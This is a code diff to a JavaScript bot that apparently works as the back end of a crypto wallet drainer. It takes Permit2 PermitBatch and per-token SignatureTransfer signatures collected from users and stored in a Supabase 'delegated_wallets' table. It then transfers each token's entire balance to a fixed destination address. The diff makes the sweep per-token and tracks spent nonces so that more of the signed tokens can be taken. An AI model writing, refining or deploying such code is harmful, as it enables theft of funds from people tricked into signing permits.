@@ -83,15 +83,15 @@ const ERC20_ABI = [
   "function symbol() view returns (string)",
 ];
 
-// Permit2 — AllowanceTransfer + gasless PermitBatch + SignatureTransfer ABIs.
+// Permit2 — AllowanceTransfer + gasless PermitBatch + single-token SignatureTransfer ABIs.
 const PERMIT2_ABI = [
   // AllowanceTransfer: bot checks stored allowance then calls transferFrom
   "function transferFrom(address from, address to, uint160 amount, address token) external",
   "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
   // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
-  // PATH B gasless: bot calls permitTransferFrom() with user's SignatureTransfer sig
-  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
+  // PATH B gasless: single-token SignatureTransfer (~200k gas per token, independent nonce)
+  "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes calldata signature) external",
 ];
 
 // ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
@@ -339,11 +339,16 @@ async function sweepPermit2Wallet(walletAddress) {
 
 // ── Gasless PATH B sweep ──────────────────────────────────────────────────────
 //
-// Wallet has type="permit2-gasless" — user signed PermitBatch + SignatureTransfer
-// off-chain (no gas). Bot pays gas to:
-//   1. permit2.permit(owner, permitBatch, sig) — sets AllowanceTransfer allowances
-//   2. permit2.transferFrom() — sweeps covered tokens
-//   3. permit2.permitTransferFrom() — sweeps uncovered tokens (single-use)
+// Wallet has type="permit2-gasless". User signed two things off-chain:
+//   permitBatch        — PermitBatch (AllowanceTransfer) for tokens already approved ERC20→Permit2
+//   signatureTransfers — array of per-token PermitTransferFrom sigs for uncovered tokens
+//
+// Bot pays gas to:
+//   1. permit2.permit(owner, permitBatch, sig)   — sets Permit2 allowances for covered tokens
+//   2. permit2.transferFrom()                    — sweeps covered tokens
+//   3. permit2.permitTransferFrom() per entry    — single-token sweep (~200k gas each)
+//      On InvalidNonce: marks entry as spent in Supabase, never retries that sig.
+//      On TRANSFER_FROM_FAILED: logs but keeps sig (ERC20 approval may not be set yet).
 
 async function sweepGaslessWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
@@ -365,12 +370,11 @@ async function sweepGaslessWallet(walletAddress) {
 
   if (!meta) { warn(`[gasless] no permit_metadata for ${checksum}`); return; }
 
-  const { permitBatch, signatureTransfer } = meta;
+  const { permitBatch, signatureTransfers } = meta;
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
 
   // ── PermitBatch path (AllowanceTransfer via signature) ─────────────────────
   if (permitBatch?.signature && Array.isArray(permitBatch.details) && permitBatch.details.length > 0) {
-    // Check if allowances are already set (permit was previously called)
     let needsPermit = false;
     for (const detail of permitBatch.details) {
       try {
@@ -383,13 +387,13 @@ async function sweepGaslessWallet(walletAddress) {
       log(`[gasless] ${checksum} — calling permit2.permit() (${permitBatch.details.length} token(s))`);
       try {
         const batchArg = {
-          details:    permitBatch.details.map(d => ({
+          details:     permitBatch.details.map(d => ({
             token:      d.token,
             amount:     BigInt(d.amount),
             expiration: BigInt(d.expiration),
             nonce:      Number(d.nonce),
           })),
-          spender:    permitBatch.spender,
+          spender:     permitBatch.spender,
           sigDeadline: BigInt(permitBatch.sigDeadline),
         };
         const fee = await getFeeData();
@@ -401,7 +405,6 @@ async function sweepGaslessWallet(walletAddress) {
       } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
     }
 
-    // Sweep using transferFrom (allowances now set)
     for (const detail of permitBatch.details) {
       const tokenAddr = normalizeAddress(detail.token);
       if (!tokenAddr) continue;
@@ -409,7 +412,7 @@ async function sweepGaslessWallet(walletAddress) {
         const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
         const balance = await token.balanceOf(checksum);
         if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
-        log(`[gasless/allowance] ${checksum} balance — transferFrom ${tokenAddr.slice(0, 10)}`);
+        log(`[gasless/allowance] ${checksum} balance=${balance} — transferFrom ${tokenAddr.slice(0, 10)}`);
         const fee = await getFeeData();
         const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr,
           { gasLimit: 150_000n, ...fee });
@@ -421,58 +424,85 @@ async function sweepGaslessWallet(walletAddress) {
     }
   }
 
-  // ── SignatureTransfer path (single-use, requires ERC20→Permit2 allowance) ───
-  if (signatureTransfer?.signature && Array.isArray(signatureTransfer.permitted) && signatureTransfer.permitted.length > 0) {
-    const deadline = BigInt(signatureTransfer.deadline);
-    if (deadline < nowSecs) {
-      warn(`[gasless/sig] SignatureTransfer expired for ${checksum}`);
-      return;
-    }
+  // ── Per-token SignatureTransfer path (~200k gas per token, independent nonces) ─
+  //
+  // Each entry has its own nonce — one failure does not affect other tokens.
+  // After InvalidNonce:       mark spent=true in Supabase, never retry.
+  // After TRANSFER_FROM_FAILED: keep sig — ERC20→Permit2 may not be approved yet.
 
-    // Only include tokens that currently have a non-zero balance
-    const tokensWithBalance = [];
-    for (const p of signatureTransfer.permitted) {
-      const addr = normalizeAddress(p.token);
-      if (!addr) continue;
-      try {
-        const token   = new ethers.Contract(addr, ERC20_ABI, rpcProvider);
-        const balance = await token.balanceOf(checksum);
-        if (balance > 0n) tokensWithBalance.push({ token: addr, balance, amount: p.amount });
-      } catch {}
+  if (!Array.isArray(signatureTransfers) || signatureTransfers.length === 0) return;
+
+  let sigMetaChanged = false;
+  const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));
+
+  for (let i = 0; i < updatedSigs.length; i++) {
+    const entry = updatedSigs[i];
+    if (!entry?.signature || entry.spent) {
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+      continue;
     }
 
-    if (!tokensWithBalance.length) return;
+    const deadline = BigInt(entry.deadline);
+    if (deadline < nowSecs) {
+      warn(`[gasless/sig] entry ${i} expired for ${checksum} — marking spent`);
+      updatedSigs[i].spent = true;
+      sigMetaChanged = true;
+      continue;
+    }
 
-    // Must call with the full permitted array from the signature (subset would break sig)
-    log(`[gasless/sig] ${checksum} — ${tokensWithBalance.length} token(s) with balance — permitTransferFrom`);
+    const tokenAddr = normalizeAddress(entry.token);
+    if (!tokenAddr) continue;
+
     try {
-      const permitArg = {
-        permitted: signatureTransfer.permitted.map(p => ({
-          token:  normalizeAddress(p.token) || p.token,
-          amount: BigInt(p.amount),
-        })),
-        nonce:    BigInt(signatureTransfer.nonce),
-        deadline: BigInt(signatureTransfer.deadline),
-      };
-      // transferDetails must match the full permitted array order
-      const transferDetails = signatureTransfer.permitted.map(p => {
-        const addr    = normalizeAddress(p.token) || p.token;
-        const matched = tokensWithBalance.find(t => t.token.toLowerCase() === addr.toLowerCase());
-        return { to: DESTINATION_ADDRESS, requestedAmount: matched ? matched.balance : 0n };
-      });
+      const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+      const balance = await token.balanceOf(checksum);
+      if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
+
+      log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} — permitTransferFrom`);
+
       const fee = await getFeeData();
       const tx  = await permit2.permitTransferFrom(
-        permitArg, transferDetails, checksum, signatureTransfer.signature,
-        { gasLimit: BigInt(signatureTransfer.permitted.length) * 150_000n + 50_000n, ...fee }
+        {
+          permitted: { token: tokenAddr, amount: BigInt(entry.amount) },
+          nonce:     BigInt(entry.nonce),
+          deadline:  BigInt(entry.deadline),
+        },
+        { to: DESTINATION_ADDRESS, requestedAmount: balance },
+        checksum,
+        entry.signature,
+        { gasLimit: 220_000n, ...fee }
       );
       log(`[gasless/sig] permitTransferFrom tx: ${tx.hash}`);
       await tx.wait();
-      log(`[gasless/sig] confirmed for ${checksum}`);
+      log(`[gasless/sig] confirmed — ${entry.symbol ?? tokenAddr.slice(0, 10)} swept for ${checksum}`);
+      updatedSigs[i].spent = true;
+      sigMetaChanged = true;
+
     } catch (e) {
       const msg = e.message ?? "";
-      if (/InvalidNonce|nonce/i.test(msg)) warn(`[gasless/sig] Signature already used for ${checksum}`);
-      else err(`[gasless/sig] permitTransferFrom for ${checksum}: ${msg}`);
+      if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
+        warn(`[gasless/sig] Nonce already used for ${entry.symbol ?? tokenAddr.slice(0, 10)} (${checksum}) — marking spent`);
+        updatedSigs[i].spent = true;
+        sigMetaChanged = true;
+      } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
+        warn(`[gasless/sig] TRANSFER_FROM_FAILED for ${entry.symbol ?? tokenAddr.slice(0, 10)} — ERC20->Permit2 not set, keeping sig`);
+      } else {
+        err(`[gasless/sig] permitTransferFrom ${tokenAddr} for ${checksum}: ${msg}`);
+      }
+    }
+    await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+  }
+
+  if (sigMetaChanged && supabase) {
+    try {
+      await supabase
+        .from("delegated_wallets")
+        .update({ permit_metadata: { ...meta, signatureTransfers: updatedSigs } })
+        .eq("address", checksum.toLowerCase())
+        .eq("chain", CHAIN);
+      log(`[gasless/sig] Updated spent flags in Supabase for ${checksum}`);
+    } catch (e) {
+      err(`[gasless/sig] Failed to update Supabase for ${checksum}: ${e.message}`);
     }
   }
 }
